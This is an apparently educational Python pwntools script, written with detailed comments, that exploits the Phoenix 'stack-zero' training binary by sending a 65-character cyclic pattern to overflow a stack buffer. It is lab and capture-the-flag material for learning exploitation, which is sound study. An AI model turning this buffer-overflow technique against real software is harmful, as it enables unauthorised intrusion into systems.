#!/usr/bin/env python3

from pwn import *

# Need to set the pwntools "context" context for controlling
# many settings in pwntools library's capabilities
#
# The context is for little-endian AMD64 architecture running on Linux OS
context.update(arch='amd64', os='linux')
#
# Using this to log and see all data transmitted for debugging purposes
# if necessary. This line can be commented out when the exploit is finalized 
# and everything is good
#context.log_level = "debug"
#
#################################################################################################
#
# Preparing the exploit's payload
# This is a patterned string with 65 characters of value "aaaabaaacaaadaaaeaaaf..."
# Such a patterned string allows for the exploit developer to easily identify
# the portion responsible for overwriting a certain location in memory 
# [This idea will be explored in later Phoenix challenges]
payload = cyclic(65)
#
################################################################################################
#
# Launching the exploit!
print("Launching The Phoenix Stack Zero Exploit!")

# Going into the /opt/phoenix/amd64 directory and launching the "stack-zero" binary
# Notice env={} in order to *not* set any of the execution environment's environmental variables
p = process(["stack-zero"], env={}, cwd="/opt/phoenix/amd64")

# Sending the command-line inputted payload into the executing stack-zero process
p.sendline(payload)

# Making the process interactive so users can
# interact with the process via its terminal!
p.interactive() 
